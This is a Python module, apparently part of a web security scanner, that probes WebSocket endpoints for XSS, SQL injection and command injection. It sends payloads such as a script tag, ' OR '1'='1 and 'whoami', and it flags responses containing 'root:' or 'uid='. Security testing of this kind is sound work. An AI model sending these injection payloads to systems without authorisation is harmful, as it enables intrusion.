import json
from modules.base import BaseModule


class WebsocketModule(BaseModule):
    NAME = "websocket"
    DESCRIPTION = "WebSocket injection - XSS, SQLi, command injection via WS messages"

    PAYLOADS = [
        {"type": "message", "content": "<script>alert(1)</script>"},
        {"type": "query",   "sql": "' OR '1'='1"},
        {"type": "cmd",     "exec": "whoami"},
        {"search": "' OR 1=1--"},
    ]

    WS_PATHS = ["/ws", "/websocket", "/socket", "/ws/chat", "/ws/notify"]

    def run(self):
        self.log.info("[websocket] Probing WebSocket endpoints")
        try:
            import websocket as ws_lib
        except ImportError:
            self.log.debug("[websocket] websocket-client not installed, skipping")
            return

        for path in self.WS_PATHS:
            scheme = "wss" if self.target.startswith("https") else "ws"
            from urllib.parse import urlparse
            host = urlparse(self.target).netloc
            ws_url = f"{scheme}://{host}{path}"
            self._probe(ws_lib, ws_url)

    def _probe(self, ws_lib, ws_url: str):
        received = []

        def on_message(ws, msg):
            received.append(msg)

        def on_open(ws):
            for payload in self.PAYLOADS:
                ws.send(json.dumps(payload))
            ws.close()

        try:
            app = ws_lib.WebSocketApp(ws_url, on_message=on_message, on_open=on_open)
            app.run_forever(ping_timeout=5)
        except Exception as e:
            self.log.debug(f"[websocket] {ws_url} error: {e}")
            return

        for msg in received:
            if any(kw in msg for kw in ["root:", "uid=", "<script>", "error in"]):
                self.add_finding(
                    severity="HIGH",
                    title="WebSocket injection - dangerous response",
                    url=ws_url,
                    detail="WebSocket endpoint reflected or executed injected payload.",
                    evidence=msg[:200],
                    remediation=(
                        "Validate and sanitise all WebSocket message inputs "
                        "using the same rigour as HTTP endpoints."
                    ),
                )
                return
